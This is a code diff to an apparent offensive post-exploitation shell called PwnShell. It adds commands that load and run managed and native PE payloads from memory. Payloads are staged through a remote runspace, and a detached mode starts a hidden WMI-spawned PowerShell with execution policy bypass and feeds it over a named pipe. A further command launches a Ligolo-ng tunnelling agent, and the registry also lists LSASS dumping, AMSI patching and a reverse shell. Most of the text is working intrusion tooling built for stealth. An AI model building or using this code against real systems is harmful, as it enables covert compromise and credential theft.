@@ -5,14 +5,16 @@ shell.pwnshell — PwnShell v2.0 Operator Interactive Shell
 import os
 import sys
 import re
+import binascii
 import logging
 import time
 import textwrap
 import stat
 import secrets
+import subprocess
 from pathlib import PureWindowsPath, Path
 from ipaddress import ip_address
-from base64 import b64decode
+from base64 import b64decode, b64encode
 from datetime import datetime
 from typing import Optional, List, Dict, Any, Callable
 from Cryptodome.Hash import SHA256
@@ -31,6 +33,14 @@ from ..core.session_mgr import SessionManager
 from ..core.tunnel import Socks5Server, PortForwarder
 from ..core.loot import LootManager
 from ..core.opsec import OPSECProfile
+from ..core.noconsolation import (
+    NoConsolationError,
+    NoConsolationOptions,
+    inspect_pe,
+    load_noconsolation_assets,
+    load_operator_payload,
+    pack_noconsolation_arguments,
+)
 from ..modules import ModuleManager
 
 from .ui       import R, G, Y, B, M, C, W, DIM, BLD, RST, c, _BANNER, _COMPLETIONS
@@ -104,6 +114,7 @@ COMMAND_REGISTRY = {
         "!session [list|switch|save|exec-all]": "Multi-session manager & jump graph",
         "!socks [PORT|stop|status]": "Direct local SOCKS5 proxy (default: 1080)",
         "!portfwd [LPORT RHOST:RPORT|list|stop]": "Direct local TCP port forwarder",
+        "!ligolo [--remote] AGENT [ARG..]": "Launch a detached in-memory Ligolo-ng agent",
         "!module [list|run <name>]": "Extensible module & plugin subsystem",
         "!loot": "View organized credentials & artifacts",
         "!opsec [stealth|balanced|aggressive|hybrid-cloud]": "Toggle execution jitter & profile",
@@ -113,7 +124,7 @@ COMMAND_REGISTRY = {
         "!adcs [-q|--template <T>|--ca <CA>|--wsus]": "ADCS CA/template/ACL & WSUS triage",
         "!kerberos [--roast|--asrep|--dmsa|--diamond]": "Kerberos exposure, RBCD and dMSA triage",
         "!entra [-s]": "Entra join-state and cloud-cache inventory",
-        "!creds [--vault|--dpapi|--decrypt B64|--history|--browser]": "Credential artifact inventory & DPAPI unprotect",
+        "!creds [--vault|--dpapi|--decrypt B64|--history|--browser|--lsa]": "Credential artifacts, DPAPI unprotect & LSASS dump",
         "!laps [-a|--encrypted]": "Windows LAPS hunter (Legacy & Server 2025)",
         "!acl [--target <T>|--tier0]": "Active Directory DACL & privilege escalation scout",
         "!token [--list|--privs]": "Process token inventory & privilege audit",
@@ -133,6 +144,7 @@ COMMAND_REGISTRY = {
         "!amsi": "Patch AmsiScanBuffer in-process (polymorphic)",
         "!psrun [-xor] URL": "Load & exec remote PS1",
         "!netrun [-xor] URL [ARG..]": "Load & exec remote .NET assembly",
+        "!noconsolation [--capture-output|--detached] [--native|--managed] SOURCE [ARG..]": "Run managed/native PE from memory",
         "!revshell IP PORT": "Raw Winsock reverse shell",
         "!log / !stoplog": "Toggle session transcript",
         "exit / quit / Ctrl+D": "Close session",
@@ -250,6 +262,7 @@ class PwnShell:
                 ("!session",    self._session_dispatch),
                 ("!socks",      self._socks_dispatch),
                 ("!portfwd",    self._portfwd_dispatch),
+                ("!ligolo",     self.ligolo),
                 ("!module",     self._module_dispatch),
                 ("!loot",       self._loot_dispatch),
                 ("!opsec",      self._opsec_dispatch),
@@ -270,6 +283,7 @@ class PwnShell:
                 ("!upload",     self.upload),
                 ("!amsi",       lambda args: self._no_args_dispatch(args, self.amsi_bypass, "!amsi")),
                 ("!netrun",     self.netrun),
+                ("!noconsolation", self.noconsolation),
                 ("!psrun",      self.psrun),
                 ("!revshell",   self.revshell),
                 ("!adtriage",   self._adtriage_dispatch),
@@ -834,6 +848,517 @@ try {{
 """
         interrupted = self.run_with_interrupt(script, self.write_line)
         return {"status": "interrupted" if interrupted else "completed"}
+
+    def _max_memory_execution_size(self) -> int:
+        try:
+            value = int(os.environ.get("PWNRM_MAX_EXEC", 64 * 1024 * 1024))
+            if not 1 <= value <= 512 * 1024 * 1024:
+                raise ValueError
+            return value
+        except ValueError:
+            self.write_warning("PWNRM_MAX_EXEC is invalid; using the 64 MiB default.")
+            return 64 * 1024 * 1024
+
+    def _stage_runspace_bytes(self, data: bytes, label: str) -> str:
+        """Chunk local bytes into a runspace-persistent MemoryStream."""
+        variable = f"PwnRM_{label}_{secrets.token_hex(8)}"
+        error_count = len(getattr(self, "last_run_errors", []))
+        self.run_sync(f"$global:{variable} = New-Object IO.MemoryStream")
+        for chunk in chunks(data, self._transfer_chunk_size()):
+            encoded = b64str(chunk)
+            self.run_sync(
+                f"$c=[Convert]::FromBase64String('{encoded}');"
+                f"try{{$global:{variable}.Write($c,0,$c.Length)}}"
+                "finally{if($c){[Array]::Clear($c,0,$c.Length)};Remove-Variable c -ErrorAction SilentlyContinue}"
+            )
+            if len(getattr(self, "last_run_errors", [])) > error_count:
+                self.run_sync(
+                    f"if($global:{variable}){{$global:{variable}.Dispose()}};"
+                    f"Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue"
+                )
+                raise NoConsolationError(f"failed to stage {label} bytes in the remote runspace")
+        return variable
+
+    @staticmethod
+    def _background_job_preamble() -> str:
+        return r'''
+if (-not $global:PwnRMNoConJobs) { $global:PwnRMNoConJobs = @{} }
+foreach ($oldId in @($global:PwnRMNoConJobs.Keys)) {
+    $oldJob = $global:PwnRMNoConJobs[$oldId]
+    if ($oldJob.Async.IsCompleted) {
+        try { [void]$oldJob.PowerShell.EndInvoke($oldJob.Async) } catch {}
+        $oldJob.PowerShell.Dispose()
+        $global:PwnRMNoConJobs.Remove($oldId)
+    }
+}
+'''
+
+    def _run_detached_memory(
+        self,
+        *,
+        blobs: list[bytes],
+        kind: str,
+        architecture: str,
+        setup: str,
+        execute: str,
+    ):
+        """Hand in-memory blobs to a WMI-created PowerShell process over a pipe."""
+        if kind not in {"managed", "native"} or architecture not in {"x86", "x64"}:
+            raise NoConsolationError("invalid detached execution configuration")
+
+        pipe_name = f"PwnRM-{secrets.token_hex(16)}"
+        variables = []
+        try:
+            for index, blob in enumerate(blobs):
+                variables.append(self._stage_runspace_bytes(blob, f"Detached{index}"))
+        except Exception:
+            for variable in variables:
+                self.run_sync(
+                    f"if($global:{variable}){{$global:{variable}.Dispose()}};"
+                    f"Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue"
+                )
+            raise
+        blob_names = [f"$Blob{index}" for index in range(len(blobs))]
+        reads = "\n".join(f"    {name} = Read-PwnRMBlob" for name in blob_names)
+        initializers = "\n".join(f"{name} = $null" for name in blob_names)
+        clears = "\n".join(
+            f"    if ({name}) {{ [Array]::Clear({name}, 0, {name}.Length) }}"
+            for name in blob_names
+        )
+        child = f'''$ErrorActionPreference = 'Stop'
+$ProgressPreference = 'SilentlyContinue'
+{initializers}
+$Pipe = $null
+$Reader = $null
+try {{
+    $Pipe = New-Object -TypeName IO.Pipes.NamedPipeClientStream -ArgumentList @(
+        '.', '{pipe_name}', [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None
+    )
+    $Pipe.Connect(15000)
+    $Reader = New-Object IO.BinaryReader($Pipe)
+    function Read-PwnRMBlob {{
+        $Length = $Reader.ReadInt32()
+        if ($Length -lt 0 -or $Length -gt 536870912) {{ throw 'Invalid PwnRM pipe frame length' }}
+        [byte[]]$Bytes = $Reader.ReadBytes($Length)
+        if ($Bytes.Length -ne $Length) {{ throw 'Truncated PwnRM pipe frame' }}
+        return ,$Bytes
+    }}
+{reads}
+{setup}
+    $Pipe.WriteByte(165)
+    $Pipe.Flush()
+    $Reader.Dispose()
+    $Reader = $null
+    $Pipe = $null
+{execute}
+}} finally {{
+    if ($Reader) {{ $Reader.Dispose() }} elseif ($Pipe) {{ $Pipe.Dispose() }}
+{clears}
+}}
+'''
+        encoded_child = b64encode(child.encode("utf-16le")).decode("ascii")
+        prepare = "\n".join(
+            f"$Blob{index} = $global:{variable}.ToArray(); "
+            f"$global:{variable}.Dispose(); "
+            f"Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue"
+            for index, variable in enumerate(variables)
+        )
+        writes = "\n".join(
+            f"    $Writer.Write([int]$Blob{index}.Length); $Writer.Write([byte[]]$Blob{index})"
+            for index in range(len(blobs))
+        )
+        clear_parent = "\n".join(
+            f"    if ($Blob{index}) {{ [Array]::Clear($Blob{index}, 0, $Blob{index}.Length) }}"
+            for index in range(len(blobs))
+        )
+        ps_directory = "SysWOW64" if architecture == "x86" else "System32"
+        script = f'''$ErrorActionPreference = 'Stop'
+{prepare}
+$Pipe = $null
+$Writer = $null
+$DetachedPid = 0
+$Acknowledged = $false
+try {{
+    $Pipe = New-Object -TypeName IO.Pipes.NamedPipeServerStream -ArgumentList @(
+        '{pipe_name}', [IO.Pipes.PipeDirection]::InOut, 1,
+        [IO.Pipes.PipeTransmissionMode]::Byte, [IO.Pipes.PipeOptions]::Asynchronous
+    )
+    $PowerShellPath = Join-Path $env:WINDIR '{ps_directory}\\WindowsPowerShell\\v1.0\\powershell.exe'
+    $CommandLine = '"' + $PowerShellPath + '" -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded_child}'
+    $Created = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{{ CommandLine = $CommandLine }}
+    if ($Created.ReturnValue -ne 0 -or -not $Created.ProcessId) {{
+        throw "Win32_Process.Create failed (return=$($Created.ReturnValue))"
+    }}
+    $DetachedPid = [int]$Created.ProcessId
+    $PendingConnection = $Pipe.BeginWaitForConnection($null, $null)
+    if (-not $PendingConnection.AsyncWaitHandle.WaitOne(15000)) {{
+        throw 'Detached process did not connect to its memory pipe within 15 seconds'
+    }}
+    $Pipe.EndWaitForConnection($PendingConnection)
+    $Writer = New-Object IO.BinaryWriter($Pipe)
+{writes}
+    $Writer.Flush()
+    [byte[]]$Ack = @(0)
+    $PendingAck = $Pipe.BeginRead($Ack, 0, 1, $null, $null)
+    if (-not $PendingAck.AsyncWaitHandle.WaitOne(15000)) {{
+        throw 'Detached process did not acknowledge the payload within 15 seconds'
+    }}
+    $AckLength = $Pipe.EndRead($PendingAck)
+    if ($AckLength -ne 1 -or $Ack[0] -ne 165) {{ throw 'Invalid detached process acknowledgement' }}
+    $Acknowledged = $true
+    Write-Output "PwnRM detached {kind} memory job started: PID $DetachedPid"
+}} finally {{
+    if ($Writer) {{ $Writer.Dispose() }} elseif ($Pipe) {{ $Pipe.Dispose() }}
+    if (-not $Acknowledged -and $DetachedPid -gt 0) {{
+        Stop-Process -Id $DetachedPid -Force -ErrorAction SilentlyContinue
+    }}
+{clear_parent}
+}}
+'''
+        interrupted = self.run_with_interrupt(script, self.write_line)
+        return {
+            "status": "interrupted" if interrupted else "completed",
+            "capture_output": False,
+            "background": not interrupted,
+            "detached": not interrupted,
+        }
+
+    def _run_managed_memory(
+        self,
+        payload: bytes,
+        argv: list[str],
+        capture_output: bool,
+        detached: bool = False,
+        architecture: str = "x64",
+    ):
+        if detached:
+            encoded_argv = "\0".join(argv).encode("utf-8")
+            return self._run_detached_memory(
+                blobs=[payload, encoded_argv],
+                kind="managed",
+                architecture=architecture,
+                setup=r'''    $Assembly = [Reflection.Assembly]::Load($Blob0)
+    if ($Blob1.Length -eq 0) { [string[]]$Arguments = @() }
+    else { [string[]]$Arguments = [Text.Encoding]::UTF8.GetString($Blob1).Split([char]0) }
+''',
+                execute=r'''    if ($Assembly.EntryPoint.GetParameters().Length -eq 0) {
+        [void]$Assembly.EntryPoint.Invoke($null, $null)
+    } else {
+        [void]$Assembly.EntryPoint.Invoke($null, [object[]](,$Arguments))
+    }
+''',
+            )
+
+        variable = self._stage_runspace_bytes(payload, "ManagedPE")
+        argv_ps = "[string[]]@(" + ",".join(str_b64(arg) for arg in argv) + ")"
+        if capture_output:
+            script = f'''
+{import_HostWriter}
+$buf = $global:{variable}.ToArray()
+$global:{variable}.Dispose()
+Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue
+$out = {new_HostWriter}
+$oldOut = [Console]::Out
+$oldErr = [Console]::Error
+try {{
+    $dll = [Reflection.Assembly]::Load($buf)
+    [Console]::SetOut($out)
+    [Console]::SetError($out)
+    $argv = {argv_ps}
+    if ($dll.EntryPoint.GetParameters().Length -eq 0) {{
+        [void]$dll.EntryPoint.Invoke($null, $null)
+    }} else {{
+        [void]$dll.EntryPoint.Invoke($null, [object[]](,$argv))
+    }}
+}} finally {{
+    [Console]::SetOut($oldOut)
+    [Console]::SetError($oldErr)
+    if ($out) {{ $out.Dispose() }}
+    if ($buf) {{ [Array]::Clear($buf, 0, $buf.Length) }}
+    Remove-Variable @('buf','dll','out','oldOut','oldErr','argv') -ErrorAction SilentlyContinue
+}}
+'''
+            interrupted = self.run_with_interrupt(script, self.write_line)
+            return {"status": "interrupted" if interrupted else "completed", "capture_output": True}
+
+        script = f'''
+$buf = $global:{variable}.ToArray()
+$global:{variable}.Dispose()
+Remove-Variable -Scope Global -Name {variable} -ErrorAction SilentlyContinue
+{self._background_job_preamble()}
+$runner = {{
+    param([byte[]]$Payload, [string[]]$Arguments)
+    try {{
+        $assembly = [Reflection.Assembly]::Load($Payload)
+        if ($assembly.EntryPoint.GetParameters().Length -eq 0) {{
+            [void]$assembly.EntryPoint.Invoke($null, $null)
+        }} else {{
+            [void]$assembly.EntryPoint.Invoke($null, [object[]](,$Arguments))
+        }}
+    }} finally {{
+        if ($Payload) {{ [Array]::Clear($Payload, 0, $Payload.Length) }}
+    }}
+}}
+$jobId = [Guid]::NewGuid().ToString('N')
+$worker = [PowerShell]::Create()
+[void]$worker.AddScript($runner.ToString())
+[void]$worker.AddArgument($buf)
+[void]$worker.AddArgument(({argv_ps}))
+$async = $worker.BeginInvoke()
+$global:PwnRMNoConJobs[$jobId] = @{{ PowerShell = $worker; Async = $async; Kind = 'managed' }}
+Write-Output "PwnRM background memory job started: $jobId"
+'''
+        interrupted = self.run_with_interrupt(script, self.write_line)
+        return {
+            "status": "interrupted" if interrupted else "completed",
+            "capture_output": False,
+            "background": not interrupted,
+        }
+
+    def _run_native_memory(
+        self,
+        *,
+        source: str,
+        payload: bytes,
+        remote_source: bool,
+        argv: list[str],
+        options: NoConsolationOptions,
+        capture_output: bool,
+        architecture: str,
+        detached: bool = False,
+    ):
+        loader, bof = load_noconsolation_assets(architecture)
+        packed = pack_noconsolation_arguments(
+            source=source,
+            payload=payload,
+            remote_source=remote_source,
+            argv=argv,
+            options=options,
+        )
+        if detached:
+            return self._run_detached_memory(
+                blobs=[loader, bof, packed],
+                kind="native",
+                architecture=architecture,
+                setup=r'''    $LoaderText = [Text.Encoding]::UTF8.GetString($Blob0)
+    . ([ScriptBlock]::Create($LoaderText))
+    Remove-Variable LoaderText -ErrorAction SilentlyContinue
+''',
+                execute=r'''    Invoke-PwnRMBof -BOFBytes $Blob1 -EntryPoint go -PackedArguments $Blob2
+''',
+            )
+
+        loader_var = self._stage_runspace_bytes(loader, "InvokeBof")
+        bof_var = self._stage_runspace_bytes(bof, "NoConBof")
+        args_var = self._stage_runspace_bytes(packed, "NoConArgs")
+        prepare = f'''
+$loaderBytes = $global:{loader_var}.ToArray()
+$bofBytes = $global:{bof_var}.ToArray()
+$packedBytes = $global:{args_var}.ToArray()
+$global:{loader_var}.Dispose(); $global:{bof_var}.Dispose(); $global:{args_var}.Dispose()
+Remove-Variable -Scope Global -Name {loader_var},{bof_var},{args_var} -ErrorAction SilentlyContinue
+'''
+        if capture_output:
+            script = prepare + r'''
+try {
+    if (-not (Get-Command Invoke-PwnRMBof -CommandType Function -ErrorAction SilentlyContinue)) {
+        $loaderText = [Text.Encoding]::UTF8.GetString($loaderBytes)
+        . ([ScriptBlock]::Create($loaderText))
+        Set-Item -Path Function:\global:Invoke-PwnRMBof -Value ${function:Invoke-PwnRMBof}
+    }
+    Invoke-PwnRMBof -BOFBytes $bofBytes -EntryPoint go -PackedArguments $packedBytes
+} finally {
+    if ($loaderBytes) { [Array]::Clear($loaderBytes,0,$loaderBytes.Length) }
+    if ($bofBytes) { [Array]::Clear($bofBytes,0,$bofBytes.Length) }
+    if ($packedBytes) { [Array]::Clear($packedBytes,0,$packedBytes.Length) }
+}
+'''
+            interrupted = self.run_with_interrupt(script, self.write_line)
+            return {"status": "interrupted" if interrupted else "completed", "capture_output": True}
+
+        script = prepare + self._background_job_preamble() + r'''
+$runner = {
+    param([byte[]]$Loader, [byte[]]$Bof, [byte[]]$Arguments)
+    try {
+        . ([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString($Loader)))
+        Invoke-PwnRMBof -BOFBytes $Bof -EntryPoint go -PackedArguments $Arguments
+    } finally {
+        if ($Loader) { [Array]::Clear($Loader,0,$Loader.Length) }
+        if ($Bof) { [Array]::Clear($Bof,0,$Bof.Length) }
+        if ($Arguments) { [Array]::Clear($Arguments,0,$Arguments.Length) }
+    }
+}
+$jobId = [Guid]::NewGuid().ToString('N')
+$worker = [PowerShell]::Create()
+[void]$worker.AddScript($runner.ToString())
+[void]$worker.AddArgument($loaderBytes)
+[void]$worker.AddArgument($bofBytes)
+[void]$worker.AddArgument($packedBytes)
+$async = $worker.BeginInvoke()
+$global:PwnRMNoConJobs[$jobId] = @{ PowerShell = $worker; Async = $async; Kind = 'native' }
+Write-Output "PwnRM background No-Consolation job started: $jobId"
+'''
+        interrupted = self.run_with_interrupt(script, self.write_line)
+        return {
+            "status": "interrupted" if interrupted else "completed",
+            "capture_output": False,
+            "background": not interrupted,
+        }
+
+    # ── !noconsolation ───────────────────────────────────────────────────────
+    def noconsolation(self, cmdline: str):
+        args = split_args(cmdline)
+        usage = (
+            "usage: !noconsolation [--capture-output] [--native|--managed] "
+            "[--remote] [--detached] [--timeout SEC] SOURCE [ARG..]"
+        )
+        if not args:
+            self.write_warning(usage)
+            return {"status": "error", "error": "missing payload"}
+
+        capture_output = False
+        detached = False
+        remote_source = False
+        mode = ""
+        timeout = None
+        method = ""
+        unicode_method = False
+        link_to_peb = False
+        dont_unload = False
+        load_all_dependencies = False
+        idx = 0
+        try:
+            while idx < len(args):
+                arg = args[idx].lower()
+                if arg in {"--capture-output", "--capture"}:
+                    capture_output = True
+                elif arg == "--detached":
+                    detached = True
+                elif arg == "--remote":
+                    remote_source = True
+                elif arg in {"--native", "--managed"}:
+                    chosen = arg[2:]
+                    if mode and mode != chosen:
+                        raise ValueError("choose only one of --native or --managed")
+                    mode = chosen
+                elif arg == "--timeout":
+                    idx += 1
+                    if idx >= len(args):
+                        raise ValueError("--timeout requires seconds")
+                    timeout = int(args[idx])
+                    if not 0 <= timeout <= 86400:
+                        raise ValueError("timeout must be between 0 and 86400 seconds")
+                elif arg == "--method":
+                    idx += 1
+                    if idx >= len(args) or not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_@?$]{0,127}", args[idx]):
+                        raise ValueError("invalid or missing DLL method name")
+                    method = args[idx]
+                elif arg == "--unicode":
+                    unicode_method = True
+                elif arg == "--link-to-peb":
+                    link_to_peb = True
+                elif arg == "--dont-unload":
+                    dont_unload = True
+                elif arg == "--load-all-dependencies":
+                    load_all_dependencies = True
+                elif arg.startswith("-"):
+                    raise ValueError(f"unknown option: {args[idx]}")
+                else:
+                    break
+                idx += 1
+            if idx >= len(args):
+                raise ValueError("payload source is missing")
+            if detached and capture_output:
+                raise ValueError("--detached cannot be combined with --capture-output")
+        except (ValueError, TypeError) as exc:
+            self.write_warning(f"{usage} ({exc})")
+            return {"status": "error", "error": str(exc)}
+
+        source, argv = args[idx], args[idx + 1:]
+        if remote_source and not mode:
+            self.write_warning("--remote requires an explicit --native or --managed mode.")
+            return {"status": "error", "error": "remote payload mode is ambiguous"}
+
+        effective_timeout = timeout if timeout is not None else (60 if capture_output else 0)
+        try:
+            payload = b"" if remote_source else load_operator_payload(source, self._max_memory_execution_size())
+            pe_info = None if remote_source else inspect_pe(payload)
+            remote_arch = "x64" if self.run_sync("[IntPtr]::Size").strip() == "8" else "x86"
+            selected_mode = mode or ("managed" if pe_info.managed else "native")
+            if selected_mode == "managed":
+                if not remote_source and not pe_info.managed:
+                    raise NoConsolationError("--managed was selected but the PE has no CLR header")
+                if any((method, unicode_method, link_to_peb, dont_unload, load_all_dependencies)):
+                    raise NoConsolationError("native loader options cannot be combined with --managed")
+                if remote_source:
+                    # Read bytes only inside the remote runspace, then reuse the
+                    # same managed runner without touching operator disk.
+                    remote_path = self._pse(source)
+                    remote_bytes_b64 = self.run_sync(
+                        f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remote_path}'))",
+                        max_bytes=(self._max_memory_execution_size() * 2),
+                    ).strip()
+                    payload = b64decode(remote_bytes_b64, validate=True)
+                    if len(payload) > self._max_memory_execution_size():
+                        raise NoConsolationError("remote managed payload exceeds PWNRM_MAX_EXEC")
+                    if not inspect_pe(payload).managed:
+                        raise NoConsolationError("remote --managed payload has no CLR header")
+                return self._run_managed_memory(
+                    payload,
+                    argv,
+                    capture_output,
+                    detached=detached,
+                    architecture=remote_arch,
+                )
+
+            if pe_info and pe_info.architecture != remote_arch:
+                raise NoConsolationError(
+                    f"native {pe_info.architecture} payload is incompatible with the {remote_arch} WinRM process"
+                )
+            options = NoConsolationOptions(
+                timeout=effective_timeout,
+                method=method,
+                unicode_method=unicode_method,
+                no_output=not capture_output,
+                link_to_peb=link_to_peb,
+                dont_unload=dont_unload,
+                load_all_dependencies=load_all_dependencies,
+            )
+            return self._run_native_memory(
+                source=source,
+                payload=payload,
+                remote_source=remote_source,
+                argv=argv,
+                options=options,
+                capture_output=capture_output,
+                architecture=remote_arch,
+                detached=detached,
+            )
+        except (NoConsolationError, OSError, ValueError, binascii.Error) as exc:
+            self.write_error(f"No-Consolation setup failed: {exc}")
+            return {"status": "error", "error": str(exc)}
+
+    # ── !ligolo ──────────────────────────────────────────────────────────────
+    def ligolo(self, cmdline: str):
+        """Launch an operator-supplied Windows Ligolo-ng agent detached."""
+        args = split_args(cmdline)
+        usage = "usage: !ligolo [--remote] AGENT [LIGOLO_ARG..]"
+        if not args:
+            self.write_warning(usage)
+            return {"status": "error", "error": "missing Ligolo-ng agent"}
+        remote = False
+        if args[0].lower() == "--remote":
+            remote = True
+            args = args[1:]
+        if not args or args[0].startswith("-"):
+            self.write_warning(usage)
+            return {"status": "error", "error": "missing Ligolo-ng agent"}
+
+        forwarded = ["--detached", "--native"]
+        if remote:
+            forwarded.append("--remote")
+        forwarded.extend(args)
+        return self.noconsolation(subprocess.list2cmdline(forwarded))
 
     # ── !revshell ─────────────────────────────────────────────────────────────
     def revshell(self, cmdline: str):
